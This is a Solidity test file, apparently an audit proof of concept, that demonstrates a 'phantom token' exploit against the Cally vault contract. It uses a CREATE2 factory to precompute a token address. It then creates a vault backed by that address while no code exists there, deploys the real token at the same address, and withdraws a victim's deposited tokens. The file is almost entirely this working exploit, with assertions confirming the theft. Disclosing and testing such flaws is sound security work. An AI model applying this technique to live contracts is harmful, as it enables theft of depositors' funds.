pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "src/Cally.sol";
import "solmate/tokens/ERC20.sol";

/// @notice Minimal ERC20 that is compatible with Solmate’s IERC20 interface
contract ExampleToken is ERC20 {
    constructor(string memory name_, string memory sym_) ERC20(name_, sym_, 18) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @notice Deploys ExampleToken deterministically with CREATE2 so we can
///         know the address in advance (the “phantom” token address).
contract TokenFactory {
    function deploy(bytes32 salt, string memory name_, string memory sym_)
        external
        returns (address token)
    {
        token = address(new ExampleToken{salt: salt}(name_, sym_));
    }

    /// Helper used by the test to pre-compute the CREATE2 address
    function getAddress(bytes32 salt, string memory name_, string memory sym_)
        external
        view
        returns (address predicted)
    {
        bytes memory bytecode =
            abi.encodePacked(type(ExampleToken).creationCode, abi.encode(name_, sym_));
        bytes32 hash = keccak256(bytecode);
        predicted = address(
            uint160(
                uint(
                    keccak256(
                        abi.encodePacked(bytes1(0xff), address(this), salt, hash)
                    )
                )
            )
        );
    }
}

/// @dev PoC – demonstrates “phantom token” vault creation, later real
///      deployment of the ERC20 at the same address, and illicit withdrawal.
contract PhantomTokenExploitTest is Test {
    Cally internal cally;
    TokenFactory internal factory;

    address internal attacker = vm.addr(0xA11CE);
    address internal victim   = vm.addr(0xB0B);

    bytes32 internal constant TOKEN_SALT = bytes32(uint256(0xDEADBEEF));

    uint256 internal constant PHANTOM_AMOUNT = 10_000 ether;
    uint256 internal constant VICTIM_AMOUNT  = 11_000 ether;

    ExampleToken internal realToken;          // will be deployed later
    address      internal phantomTokenAddr;   // address with no code initially
    uint256      internal attackerVaultId;

    function setUp() public {
        // Give both accounts some ETH for tx execution
        vm.deal(attacker, 100 ether);
        vm.deal(victim,   100 ether);

        // Deploy core contracts
        cally   = new Cally();
        factory = new TokenFactory();

        // Pre-compute the token address that currently has no code
        phantomTokenAddr =
            factory.getAddress(TOKEN_SALT, "RealToken", "RLT");

        /////////////////////////////////
        // 1. Attacker creates vault with a NON-EXISTENT token address.
        /////////////////////////////////
        vm.startPrank(attacker);

        attackerVaultId = cally.createVault(
            PHANTOM_AMOUNT,              // fictitious collateral
            phantomTokenAddr,            // no code there yet!
            0,                           // premiumIndex
            1,                           // durationDays
            0,                           // dutchAuctionStartingStrikeIndex
            0,                           // dutchAuctionReserveStrike
            Cally.TokenType.ERC20        // tokenType
        );
        vm.stopPrank();

        // Sanity – address truly has no code right now.
        assertEq(phantomTokenAddr.code.length, 0);
    }

    /// @notice Executes the full exploit and proves that the attacker
    ///         steals real tokens that they never deposited.
    function testPhantomTokenSteal() public {
        ///////////////////////////////////////
        // 2. Legitimate token gets deployed later at the SAME address.
        ///////////////////////////////////////
        vm.prank(victim);
        address deployed =
            factory.deploy(TOKEN_SALT, "RealToken", "RLT");
        assertEq(deployed, phantomTokenAddr, "Token deployed at wrong address");

        realToken = ExampleToken(deployed);

        ///////////////////////////////////////
        // 3. Victim deposits real tokens into Cally
        //    (simulates normal protocol usage).
        ///////////////////////////////////////
        vm.prank(victim);
        realToken.mint(victim, VICTIM_AMOUNT);

        vm.prank(victim);
        realToken.approve(address(cally), VICTIM_AMOUNT);

        vm.prank(victim);
        cally.createVault(
            VICTIM_AMOUNT,               // real collateral
            address(realToken),
            0,                           // premiumIndex
            1,                           // durationDays
            0,                           // dutchAuctionStartingStrikeIndex
            0,                           // dutchAuctionReserveStrike
            Cally.TokenType.ERC20        // tokenType
        );

        // Contract now truly holds 11 000 tokens
        assertEq(realToken.balanceOf(address(cally)), VICTIM_AMOUNT);

        ///////////////////////////////////////
        // 4. Attacker initiates withdrawal on the phantom vault.
        ///////////////////////////////////////
        vm.prank(attacker);
        cally.initiateWithdraw(attackerVaultId);

        // Fast-forward so that `block.timestamp > currentExpiration`
        vm.warp(block.timestamp + 2 days);

        ///////////////////////////////////////
        // 5. Attacker withdraws and receives the 10 000 *real* tokens
        //    even though they never deposited any.
        ///////////////////////////////////////
        vm.prank(attacker);
        cally.withdraw(attackerVaultId);

        ///////////////////////////////////////
        // 6. Assertions – exploit succeeded
        ///////////////////////////////////////
        assertEq(
            realToken.balanceOf(attacker),
            PHANTOM_AMOUNT,
            "Attacker did not receive stolen tokens"
        );

        // Contract balance should now be only the victim’s remainder
        assertEq(
            realToken.balanceOf(address(cally)),
            VICTIM_AMOUNT - PHANTOM_AMOUNT,
            "Cally contract balance incorrect after theft"
        );
    }
}